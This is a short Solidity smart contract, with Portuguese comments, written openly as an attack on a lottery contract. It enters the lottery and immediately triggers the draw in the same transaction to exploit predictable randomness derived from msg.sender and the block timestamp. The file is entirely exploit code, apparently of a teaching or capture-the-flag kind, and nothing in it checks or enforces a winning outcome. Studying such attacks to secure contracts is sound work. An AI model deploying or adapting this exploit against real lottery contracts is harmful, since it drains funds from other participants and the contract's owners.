// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILottery {
    function enter() external payable;
    function drawWinner() external;
}

contract LotteryAttack {
    ILottery public lottery;
    address public attacker;

    constructor(address _lottery) {
        lottery = ILottery(_lottery);
        attacker = msg.sender;
    }

    function attack() external payable {
        require(msg.value == 0.1 ether);

        // Entra na loteria
        lottery.enter{value: 0.1 ether}();

        /*
         Força o sorteio imediatamente,
         explorando o fato de que:
         - msg.sender influencia o random
         - timestamp não muda
        */
        lottery.drawWinner();
    }

    receive() external payable {}
}
